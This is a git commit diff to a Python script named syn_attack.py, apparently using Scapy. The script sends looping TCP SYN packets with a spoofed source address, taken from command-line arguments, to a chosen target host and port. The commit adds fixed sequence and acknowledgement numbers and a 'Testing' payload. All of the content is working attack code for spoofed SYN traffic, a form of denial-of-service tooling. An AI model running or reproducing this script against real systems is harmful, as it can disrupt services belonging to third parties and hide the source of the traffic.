d10f3c1265d161c4da473efc73a80d89128111d9
e850815 <khtp91113@gmail.com>
2020-01-12 02:38:39 +0800

    syn attack with payload

--- syn_attack.py
+++ syn_attack.py
@@ -11,11 +11,14 @@ def main():
     ip.src = sys.argv[1]
     tcp.sport = int(sys.argv[2])
     tcp.flags = 'S'
+    tcp.seq = 123
+    tcp.ack = 100
 
     ip.dst = sys.argv[3]
     tcp.dport = int(sys.argv[4])
 
-    ans, unans = srloop(ip/tcp, inter=0.3, retry=2, timeout=60)
+    payload = 'Testing'
+    ans, unans = srloop(ip/tcp/payload, inter=0.3, retry=2, timeout=1)
 
 if __name__ == '__main__':
     main()
